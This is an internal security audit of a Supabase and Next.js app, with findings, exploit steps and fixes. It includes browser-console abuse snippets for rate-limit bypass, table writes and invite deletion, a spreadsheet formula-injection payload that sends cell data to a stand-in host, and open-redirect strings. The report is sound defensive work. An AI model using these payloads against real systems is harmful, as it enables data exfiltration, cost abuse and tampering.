# Security audit, October 2026

Read-only review on 2026-10-13, before client CRMs (HubSpot etc.) are connected and before the paid
pentest. No code was changed. Scope:
- every exported server action (19 `"use server"` files)
- every route handler (18 under `src/app/api`, plus `/auth/*`, the live-ads CSV and `/embed/report/[token]`)
- the final state of all 55 migrations, including the storage buckets
- `src/proxy.ts` and `safePath`
- where secrets and env vars are used

The aim was permission and scoping bugs that generic scanners miss.

## Summary

**No Critical or High findings.** The core authorization model holds:

- **Server actions check before acting.** Every server action and API route authenticates, checks the role (`canEdit`, `isAdmin`, `canPushNegatives`) before it writes or calls Notion, Windsor or Claude, and gets `client_id` from a slug or row read through the user's RLS client.
- **No cross-client writes.** No admin-client write reaches a client other than the one the RLS read confirmed.
- **The database is locked down.** Every table has RLS. No policy uses `using (true)`. Every report SQL function runs with the caller's rights. Every security-definer function pins `search_path`.

What's left falls into three groups:

1. **Claude spend with no rate limit.** Two places can run up unbounded Claude spend.
2. **Direct database writes the app doesn't allow.** Team members can make some writes through PostgREST (browser console plus the publishable key) that the app's UI doesn't permit.
3. **Weak CI and sign-in protections.** The RLS test suite can't fail CI, and the email domain rule is only enforced at sign-up.

None of these exposes one client's data to another client's team. Group 2 matters most for the CRM work: CRM data will be more sensitive, and the pattern of "the app checks, but the table allows more" should be closed before it's copied into new tables.

`corepack pnpm test:db` on 2026-10-13: the migrations applied, and **80 checks printed OK with no FAIL lines**.

**Fixed on 2026-10-13:** M1, M2 and M3 (each marked below).

Severity key:
- **Medium**: exploitable by a signed-in B&B user, or a stolen session, with real cost or integrity impact.
- **Low**: needs unusual conditions, has limited impact, or is defense in depth.
- **Info**: worth knowing or confirming.

---

## Medium

### M1. `/api/client-calls`: the rate limit is optional, and each call can run Claude

**Fixed 2026-10-13:**
- The limit counts at the start (`first`) and again whenever a request schedules Claude, so leaving `first` out still counts. `call_notes` is raised to 40, which is still 20 checks a day.
- The follow-up check only re-runs after new calls are read or an hour has passed.
- `full` is admin only.
- Errors return a generic message.

**Where:**
- `src/app/api/client-calls/route.ts:25`: the `call_notes` limit is only taken when the body has `first: true`.
- `src/app/api/client-calls/route.ts:32`: whenever no call notes are left to read, `after()` runs `extractPending`, then `checkFollowUps`.

**Why it costs money:** `checkFollowUps` (`src/lib/calls/followups.ts`) has no staleness guard here; the cron version skips a client whose last check was under 20 hours ago. Each run is a `claude-sonnet-5` call whose context holds up to 400 timeline lines and 200 Notion mirror rows.

**Exploit:** any non-viewer on a client's team, or anyone holding their session, loops `fetch('/api/client-calls', {method:'POST', body: JSON.stringify({clientSlug:'dnsfilter'})})`. Each request:
- schedules a Claude follow-up check, so Anthropic spend is unbounded;
- reads Notion, and adding `full: true` re-reads every row each time, using the shared Notion quota of about 3 requests a second.

**Fix:**
- Take `rateLimit(supabase, "call_notes")` on every request, or at least on every request that schedules Claude work.
- Skip `checkFollowUps` when `call_followups_checked_at` is recent, as the cron does.
- Allow `full` for admins only.

### M2. `addManualCall` runs Opus with no rate limit

**Fixed 2026-10-13:** a new `manual_call` limit (10 a day) is taken before the insert.

**Where:** `src/lib/calls/actions.ts:69-87`. Each call inserts a `client_calls` row through the admin client, then `after(() => extractCall(id))` runs `claude-opus-5-5` (max_tokens 12000).

**Exploit:** an editor on a client scripts `addManualCall(slug, {date, title, text: "<60k chars>"})` in a loop. Two effects:
- **Unbounded Opus spend.**
- **Permanent noise in the client brain.** Calls are never deleted, and they feed the brief, Pour a Sprint, content ideas and test reads.

CLAUDE.md says any route that calls Claude gets a limit.

**Fix:** call `rateLimit(supabase, "call_notes")` (or a new `manual_call` limit of about 10 a day) before the insert.

### M3. The RLS test suite can't fail CI

**Fixed 2026-10-13:** the script counts every line that starts with `FAIL` and exits 1 if there are any. Checked with a forced failure (exit 1) and a clean run (exit 0).

**Where:** `supabase/tests/rls-check.mjs`, run by `.github/workflows/ci.yml` (`pnpm test:db`). Every check only does `console.log("... OK")` or `console.log("FAIL: ...")`. Nothing sets a non-zero exit code.

**Exploit:** this isn't an attack. A future migration that, for example, gives viewers write access prints `FAIL:` and CI stays green. Only an error while applying a migration fails the job. Today's run has no `FAIL` lines, but that was checked by reading the output.

**Fix:**
- Count failures and end with `process.exit(failures ? 1 : 0)`, or move the checks into Vitest with `expect`.
- Add `grep -q FAIL && exit 1` in CI as a stopgap.
- Do this before adding CRM tables, so their RLS tests actually guard them.

### M4. The email domain rule is only enforced at sign-up, and offboarding doesn't revoke access

**Where:**
- `supabase/migrations/20260928000005_admin.sql:21`: the check sits in `handle_new_user`, which runs `after insert on auth.users` only.
- `has_role()` and `can_access_client()` never look at the email.

**Exploit 1, keeping access by changing email (needs the Email provider enabled in Supabase Auth):**
1. A staff member runs `supabase.auth.updateUser({ email: 'me@gmail.com' })` from the browser console and confirms it.
2. After they leave and their Workspace account is disabled, they request a magic link for the Gmail address straight from GoTrue with the publishable key. `EMAIL_SIGNIN_ENABLED` only hides the button in the app, and `sendMagicLink` only refuses when `GOOGLE_SIGNIN_ENABLED=true` (`src/app/login/actions.ts:15`).
3. They keep their role and `client_team` rows. `profiles.email` still shows the old address, so admins don't notice.

`supabase/config.toml` doesn't declare `[auth.email]`, so whether the provider is on can't be read from the repo.

**Exploit 2, an existing session keeps working (no setup needed):** disabling someone's Google account doesn't end their Supabase session. The refresh token keeps working until it's revoked. Today the only offboarding step is changing their role in Admin → People.

**Fix:**
- Add a `before update of email on auth.users` trigger that raises unless the new email is on the domain, and syncs `profiles.email`.
- And/or add `(auth.jwt()->>'email') like '%@bordeauxandburgundy.co.uk'` to `has_role()` and `can_access_client()`.
- Declare `[auth.email]` in `config.toml`, with `enable_signup` off while magic links are hidden, `enable_confirmations = true` and `double_confirm_changes = true`.
- Write an offboarding step in `docs/security.md`: set the role to none, remove them from teams, and sign them out of all sessions (`auth.admin.signOut(userId, 'global')`, or delete their sessions in the dashboard).

### M5. Team members can write table columns the app keeps for admins or the server

**Where:**
- `supabase/migrations/20260929000037_viewer_role.sql:31-45`: the update policies on `sprint_tests`, `sprints`, `sprint_items`, `sprint_changes` and `check_results` check `can_edit_client(client_id)`, and the table-wide UPDATE grant covers every column.
- `20260930000044_archive_sprint_tests.sql`: adds `archived_at` with no column guard.

**Exploit:** an AM or specialist on the team, from the browser console:
- **Archives tests.** `supabase.from('sprint_tests').update({ archived_at: new Date().toISOString() }).eq('id', X)` hides the test from everyone, admins included. In practice it's a delete that the app can't undo from the UI.
- **Renames tests.** The app allows that for admins and GTM leads only.
- **Changes test state.** They can set `status` or `outcome` directly, or point `notion_page_id` at any page.
- **On `check_results`:**
  - setting `notion_action_page_id` makes a red stop counting as "not actioned";
  - overwriting `auto_data` breaks the "recomputed on the server" snapshot.

**Fix:**
- Revoke table-wide UPDATE and grant UPDATE on the editable columns only, as `report_links` already does (`20260929000039_report_links.sql:40-41`).
- Or add a `before update` trigger that rejects changes to `archived_at`, `title`, `auto_data` and `notion_*` unless `is_admin()`, or unless there's no `auth.uid()` (the server).
- Use the column-grant pattern from day one on CRM tables.

### M6 (conditional). Invites are applied before the email is confirmed

**Where:** `supabase/migrations/20260928000005_admin.sql:25-33`. `handle_new_user` gives the invite's role and `client_team` rows as soon as the `auth.users` row is inserted.

**Exploit:** this only works if email confirmation is off or auto-confirm is on in Supabase Auth. Then anyone could call `supabase.auth.signUp({ email: '<an invited person who hasn't signed in>', password })` with the publishable key and get that person's role, including admin. With confirmation on, which is the hosted default, it isn't exploitable. But the repo doesn't pin that setting.

**Fix:**
- Pin `enable_confirmations = true` in `config.toml`, as in M4.
- Better: apply invites when `email_confirmed_at` goes from null to set, in an `after update` trigger.

---

## Low

### L1. Notion creates can be duplicated and have no rate limit

**Where:**
- `briefTest` (`src/app/(app)/clients/[slug]/sprint/test-actions.ts:165`, create at `:183`): checks `status === 'planned'`, but the status only changes after Notion replies.
- `createAction` (`src/lib/notion/actions.ts:32`): has the same race on `notion_action_page_id`, and no guard at all without a `checkResultId`.
- `briefInsight` (`src/app/(app)/clients/[slug]/insights/actions.ts:93`): has no guard.

**Exploit:** an editor on a live client (`NOTION_LIVE_CLIENTS`) double-submits, or loops `createAction(...)`. That creates many real Master Production rows, and comments with @mentions for briefs. The app can't delete them, and they set off B&B's Notion automations.

**Fix:**
- Add a `notion_write` rate limit, for example 30 a day per person.
- Claim the row atomically before calling Notion, e.g. `update sprint_tests set status='briefing' where id=$1 and status='planned' returning id`.

### L2. The public `avatars` bucket accepts any file, straight from the browser

**Where:** `supabase/migrations/20260929000032_profiles_options.sql:40-44`. The public bucket has no `file_size_limit` and no `allowed_mime_types`. The insert and update policies apply to any signed-in user, including one with no role. The app doesn't need them: `uploadAvatar` uploads with the admin client.

**Exploit:** `supabase.storage.from('avatars').upload(uid + '/x.html', blob)` (or SVG, or a large file) puts arbitrary content on a public URL on the Supabase project domain. That's useful for phishing, and storage use is unlimited.

**Fix (an additive migration):**
- Set `file_size_limit = 1048576` and `allowed_mime_types = '{image/webp,image/png,image/jpeg}'`.
- Drop the two user policies, or make them `with check (false)`.
- Consider `allowed_mime_types` on `client-files` too. It's private and only the server reads it, so that one is lower risk.

### L3. `/api/client-brain`: the `brief` and `read` steps have no rate limit

**Where:**
- `src/app/api/client-brain/route.ts:36`: the `read` step.
- `src/app/api/client-brain/route.ts:40-52`: the `brief` step with `force: true`, which skips the digest check.

Only `discover` counts against `brain_refresh`.

**Exploit:** an admin or GTM lead session loops `{step:"brief", force:true}`. The "one generating per 10 minutes" guard allows a new Opus brief as soon as each one finishes.

**Fix:** take `brain_refresh` (or a new `brain_brief` limit) on `brief` too.

### L4. `refreshFromNotion` lets any role, including viewers, run the global Notion sync

**Where:** `src/lib/notion/actions.ts:73-86`. It only checks `me.role`.

**Exploit:** a viewer (anyone in B&B's Notion workspace) loops it. Each call runs `syncNotionMirror()` for every client. Writes are deterministic, so nothing can be tampered with. But the loop uses up the shared Notion quota that the cron, brain and call readers depend on.

**Fix:** require `canEdit`, add a rate limit, or skip when the last sync started under 60 seconds ago.

### L5. Embed links accept any custom date range, with no session and no limit

**Where:** `src/app/embed/report/[token]/page.tsx:28` → `parseRange` (`src/lib/metrics/range.ts`).

**Exploit:** someone with a leaked embed link loops `?from=2018-01-01&to=2026-10-0N`. Each new date pair misses the cache and runs a full-history query through the admin client. Full histories have hit the 8-second statement timeout before, so this is a cheap way to load the database. No extra data is exposed: it's still one board of one client.

**Fix:**
- Allow only the presets plus the link's default on embeds, or round custom ranges to whole months.
- Clamp `from` to the client's first day of data.
- Add a Vercel Firewall rate rule on `/embed/*`.

### L6. Users can attribute rows to someone else

**Where:** the insert and update policies don't tie the author columns to `auth.uid()` on:
- `sprint_tests.created_by_profile_id`
- `sprint_items` and `sprint_changes.created_by_profile_id`
- `client_knowledge` and `client_briefs.created_by_profile_id`
- `check_results.checked_by_profile_id`, `flagged_to_profile_id` and `checked_at`
- `report_links.revoked_by_profile_id`

**Exploit:** a team member inserts a change log entry or check result "by" a colleague. That skews the stats in `src/lib/stats.ts` and the audit history.

**Fix:** `default auth.uid()` plus `with check (created_by_profile_id = (select auth.uid()))`, the pattern `insight_actions` and `feedback` already use. For check_results, set `checked_by_profile_id` in a trigger.

### L7. Foreign keys can point at another client's rows

**Where:**
- `content_idea_actions.run_id`
- `call_commitment_actions.commitment_id`
- `insight_actions.sprint_test_id`
- `sprint_tests.recommendation_id`, `call_commitment_id`, `content_idea_id` and `carried_from_test_id`
- `sprint_changes.hypothesis_item_id`, which `logChange` accepts from the browser (`src/app/(app)/clients/[slug]/sprint/actions.ts:89,94`)

**Problem:** foreign keys bypass RLS. A user on client A can insert a row for A that references B's run, commitment or test. If something reads actions by `commitment_id` alone, that could mark another client's call follow-up as done.

**Why it's Low:** it needs a UUID from the other client, which the user can't read.

**Fix:** extend the existing `sprint_child_client_matches()` trigger pattern to these columns. CRM tables with parent ids should use it from the start.

### L8. Admins and GTM leads can delete invites

**Where:** `supabase/migrations/20260928000001_init.sql:317-320`. The `"team_invites: admin all"` and `"client_team_invites: admin all"` policies are `for all`, which includes DELETE. These are the only `for all` policies in the repo.

**Exploit:** a GTM lead runs `supabase.from('team_invites').delete().neq('email','')`. Every pending invite is gone, and the cascade removes the client invites. That breaks "no deletes, ever".

**Fix:** replace each with separate select, insert and update policies.

### L9. `addAdPostLink` fetches from the server with no rate limit, and follows redirects

**Where:** `src/app/(app)/ad-post-actions.ts:16`. The input checks are good: the post link must be on `*.linkedin.com`, and the og:image must be on `*.licdn.com`. But each call makes two outbound fetches (up to 10 MB) and an upsert to storage. `fetch` follows redirects, so the final host isn't pinned.

**Exploit:** an editor loops it, and every call overwrites the ad's stored image. If LinkedIn ever has an open redirect, the server could be sent to fetch other hosts, a small SSRF risk.

**Fix:**
- Add a rate limit.
- Use `redirect: "manual"` and re-check each hop's host against the allowlist.

### L10. `take_rate_limit` trusts the caller's kind, limit and window

**Where:** `supabase/migrations/20260929000033_rate_limits.sql:16-32`, granted to `authenticated`.

**Exploit:** `rpc('take_rate_limit', {p_kind:'x', p_max: 2147483647, p_window_seconds: 1})` in a loop inserts rows into `rate_limit_events` without limit. That bloats the table. It can't raise anyone's real limits, because the server passes its own `p_max`.

**Fix:** allow only a fixed list of kinds and cap `p_max` inside the function, or call it only with the secret key from the server.

### L11. Report link details

**Where:** `supabase/migrations/20260929000039_report_links.sql:12,22-28`.
- **Viewers aren't excluded.** `can_share_reports` doesn't check `is_viewer()`, so someone whose role became `viewer` but who is still on a team as `am` can still create links.
- **The browser picks the token.** The insert policy lets the user choose it, and the check only requires 32 or more characters from `[A-Za-z0-9_-]`, so `'a' × 40` is valid. The app generates tokens with `randomBytes(24)`, but a direct insert could create a guessable link.

**Fix:**
- Add `and not public.is_viewer()`.
- Generate the token in a column default, e.g. `encode(gen_random_bytes(24),'base64')` made URL-safe, and revoke INSERT on the `token` column.

### L12. Formula injection in the live-ads CSV

**Where:** `src/lib/metrics/live-ads-export.ts:97`. `cell` quotes values but doesn't neutralize a leading `=`, `+`, `-`, `@`, tab or carriage return.

**Exploit:** ad, campaign and post names come from the ad platforms, and client staff can edit them. A name like `=HYPERLINK("http://x/?"&A1,"click")` becomes a live formula when the team opens the export in Excel or Sheets. CRM exports would have the same problem.

**Fix:** prefix `'` to any value that starts with one of those characters.

### L13. Paths ending in an image or font extension skip the proxy, so they get no CSP

**Where:** `src/proxy.ts:101`. The matcher excludes `.*\.(svg|png|…|ttf)$` everywhere, not only static folders.

**Exploit:** `/clients/dnsfilter.png` or `/people/<id>.svg` render dynamic pages without the CSP header or the session refresh. Login is still enforced by `(app)/layout.tsx` (`getProfile`), and `X-Frame-Options` still comes from `next.config.ts`. The only loss is CSP as defense in depth.

**Fix:** exclude specific static prefixes (`_next/static`, `_next/image`, `fonts/`, `platforms/`, `favicon.ico`) instead of any path that ends in an extension.

### L14. `safePath` lets dot segments through

**Where:** `src/lib/safe-path.ts:13`. `/.//evil.com` and `/..//evil.com` pass, and both normalize to `//evil.com`.

**Why it's Low:** both current callers put the app origin in front (`src/app/auth/confirm/route.ts`, and `emailRedirectTo` built from `APP_URL`), so nothing is exploitable today. It would become an open redirect if `safePath` were ever passed to `redirect()` on its own.

**Fix:** after the current checks, resolve the path and re-check it:
```ts
const u = new URL(s, "http://x")
if (u.origin !== "http://x" || u.pathname.startsWith("//")) return fallback
return u.pathname + u.search + u.hash
```

---

## Info (confirm or note)

- **GTM leads can make anyone an admin and demote admins** (`setProfileRole`, `src/app/(app)/admin/actions.ts:282`; `saveInvite`, `:223`). `is_admin()` includes `gtm_lead`, so the database agrees. This matches CLAUDE.md ("has admin rights"). If admin should be its own tier, only `role = 'admin'` should be able to grant or revoke it.
- **Negative keywords are free text** (`src/app/(app)/clients/[slug]/reporting/negative-actions.ts`). Up to 2,000 terms per push, and they aren't checked against the synced search terms. The `checkRoot` safety check only runs in the UI. A specialist session could push a broad, campaign-level negative such as "software". Consider running `checkRoot` on the server, or confirming before campaign-level broad or phrase pushes.
- **Raw error messages reach the browser** (`src/app/api/client-brain/route.ts:38`, `src/app/api/client-calls/route.ts:39`). `(e as Error).message` can carry Notion or Supabase details. Log the detail and return a generic message.
- **The cron secret comparison isn't constant-time** (`src/app/api/cron/*/route.ts`, e.g. `notion/route.ts:14`). Over the network this is impractical to exploit. An unset or empty secret correctly returns 401. Optional fix: `crypto.timingSafeEqual`.
- **Default table grants:** Supabase still grants DELETE and TRUNCATE on public tables to `anon` and `authenticated`. RLS blocks DELETE, and PostgREST can't TRUNCATE. For defense in depth: `revoke delete, truncate on all tables in schema public from anon, authenticated`, plus the matching `alter default privileges`.
- **Functions added after migration 034 may still be executable by `anon`.** The `alter default privileges in schema public revoke execute ... from public` statement in `20260929000034_advisor_fixes.sql` doesn't override Postgres's global PUBLIC execute default. That applies to `campaign_series` (043) and `test_ads` (045). They run with the caller's rights and anon has no read policies, so they return nothing. Check with `select has_function_privilege('anon','public.test_ads(uuid,public.platform,text[],date,date)','execute')`, and revoke explicitly in each new migration.
- **Viewers see everyone's contact details.** Viewers (the whole Notion workspace) can read every profile's email, phone, location and last-seen time, plus all `team_invites`. That follows the design, but it may be wider than intended, and it matters more once CRM contacts exist. CRM tables should not inherit "viewers see every client" by default.
- **Slack posts embed user text unescaped** (`sendFeedback`, `src/app/(app)/options/actions.ts`, and Notion action notifications). Once `SLACK_WEBHOOK_URL` is set, `<!channel>` or link markup would pass through. Escape `<`, `>` and `&`.
- **People can set their own display name** (the "own details" profile policy). That name goes into Notion's "Brief Submitted by" and comment text, so someone could pass as a colleague there.
- **Invite emails aren't normalized.** `team_invites.email` isn't lowercased on insert, while `handle_new_user` compares with `lower(new.email)`. An invite typed with capitals never applies. This is a reliability bug.
- **`finishUpload` trusts the type, size and name the browser sends.** The path is pinned to `<clientId>/`, and the bucket is private and server-read, so the risk is low.

---

## Before connecting CRMs

1. **Fix M3 first**, so RLS tests can fail CI. Then write CRM RLS tests: viewer, other-team member, removed member and no-role user, for both read and write.
2. **New CRM tables:**
   - client-scoped on `client_id`;
   - written only by the server (no user insert or update policies) or with column-level grants (M5);
   - a trigger that checks parent ids belong to the same client (L7);
   - no `for all` policies (L8).
3. **Decide whether viewers see CRM data.** The current model gives viewers every client. CRM contact data probably shouldn't follow that.
4. **CRM tokens:**
   - Keep OAuth refresh tokens server-only, in Vault or a table with RLS on and no policies.
   - Never put them in `NEXT_PUBLIC_` variables or return them to the browser.
   - Request read-only scopes where the CRM allows it.
5. **Any route that syncs or summarizes CRM data with Claude gets a rate limit**, taken on every call (M1, M2, L3).
6. **CSV exports of CRM data need the formula-injection fix** (L12).
7. **Offboarding needs a written step** that revokes sessions (M4).

## Checked and found fine

- **Server actions** (all 19 files): authenticate, then `canEdit`, `isAdmin`, `requireAdmin` or `canPushNegatives` before any write or Notion, Windsor or Claude side effect.
  - Client ids come from slug or row reads through RLS.
  - Every admin-client write is limited to the row or client that read confirmed. There is no "check client A, write client B".
  - Zod strips unknown keys, so there's no mass assignment of `role`, `client_id`, `written_by` and similar.
  - Notion's Client option and titles are derived on the server.
- **API routes:**
  - Every non-cron route calls `getProfile()`.
  - Role gates: `isAdmin` on sprint-ai, insight-review and client-brain; `canEdit` on term-review, content-ideas, client-calls and test-read.
  - Rate limits are taken before Claude runs on campaign-chat, news-chat, sprint-ai, insight-review, content-ideas, test-read and term-review, and they fail closed.
  - The polling GETs (`?run=`, `?review=`, `?brief=`) read through RLS, so another client's run can't be read. No GET writes or spends money.
- **Cron:** `!secret` returns 401, so an unset `CRON_SECRET` can't be matched by `Bearer ` or `Bearer undefined`. `/api/cron/` contains only cron routes. `?slot=`, `?linkedin=` and `?full=` only work behind the secret.
- **CSRF:** Supabase cookies are SameSite=Lax, and `vercel.app` is on the public suffix list. `/auth/signout` is POST only.
- **`/auth/confirm`:** redirects to `${origin}${safePath(next)}`. `/\evil.com`, `/%2F%2Fevil.com`, `/%5C…`, tab and newline tricks and `javascript:` are all rejected.
- **Login:**
  - The domain is checked in the action and enforced in the database (`handle_new_user` uses `lower()` and rejects `…co.uk.evil.com` and subdomains). `hd` is only a hint.
  - `emailRedirectTo` uses `APP_URL` in production, never the Host header.
  - The start page is checked against a regex before redirecting.
- **Proxy and CSP:** the nonce plus `strict-dynamic`, `base-uri 'self'`, `form-action 'self'`, `object-src 'none'`. `frame-ancestors` is Notion-only on `/embed/`, and `X-Frame-Options: DENY` applies everywhere else. Public paths are only `/login`, `/auth/`, `/embed/`, and `/design` in development.
- **Embed:**
  - The token format is checked before the lookup, and `revoked_at` is honored.
  - It shows one client and one board, chosen by the link row, and never reads a session.
  - Users can update only `revoked_at` and `revoked_by_profile_id` (column grant), and only the client's team (not viewers) can read links.
- **RLS:** all 48 tables have RLS. Since migration 037 every team write policy uses `can_edit_client`. There are no DELETE policies apart from L8, and every UPDATE policy has WITH CHECK.
  - `guard_profile_fields` can't be bypassed: `is_admin()` reads the committed row, and `profiles` has no insert policy.
  - Non-admins can't write `client_team` or either invite table.
  - The client guard triggers on `check_results` and the sprint child tables fail closed.
- **SQL functions:**
  - The security-definer helpers (`is_admin`, `has_role`, `is_viewer`, `can_access_client`, `can_edit_client`, `my_client_ids`, `can_share_reports`, `handle_new_user`) use `search_path = ''`. `take_rate_limit` and `touch_last_seen` use `public` with schema-qualified names and only act on `auth.uid()`.
  - All report functions (`campaign_daily`, `campaign_ads`, `campaign_series`, `breakdown_totals`, `ga4_landing_totals`, `search_term_candidates`, `ad_totals`, `client_data_stamp`, `test_ads` …) run with the caller's rights.
  - The views `ad_lifetimes`, `account_data_range` and `recommendation_results` are `security_invoker`. There are no materialized views and nothing in a Realtime publication.
- **Storage:**
  - `ad-previews`: private, reads checked with `can_access_client` on the folder, server writes only.
  - `client-files`: private, no user policies. The signed upload path `<clientId>/…` is built on the server after an RLS check and the rate limit.
  - `brand`: public, server-written, can't be listed.
- **Cron secret:** read from Vault at run time and never in a migration. The `net`, `cron` and `vault` schemas aren't exposed, and no public function wraps `net.http_*`.
- **Secrets:**
  - The only `NEXT_PUBLIC_` variables are the Supabase URL, the publishable key and the Turnstile site key.
  - `src/lib/supabase/admin.ts`, `server.ts`, `auth.ts`, `rate-limit.ts` and the Windsor, Notion and AI modules import `server-only`.
  - `.env.example` holds no values, and no code logs a secret.
  - There's no `dangerouslySetInnerHTML`. The one interpolated `.or()` filter (`src/lib/timeline.ts:60`) uses dates generated on the server.
- **`addAdPostLink` authorization:** RLS row lookup plus `can_edit_client`, and the admin update is limited to that row.

## Test run

`corepack pnpm test:db`, 2026-10-13: exit 0, the migrations applied, 80 checks OK, no FAIL lines (see M3: a FAIL wouldn't change the exit code).

Not covered by those tests:
- M5 and L6–L8
- the storage policies
- email change and unconfirmed sign-up, which need a real GoTrue
- anon execute on the post-034 functions
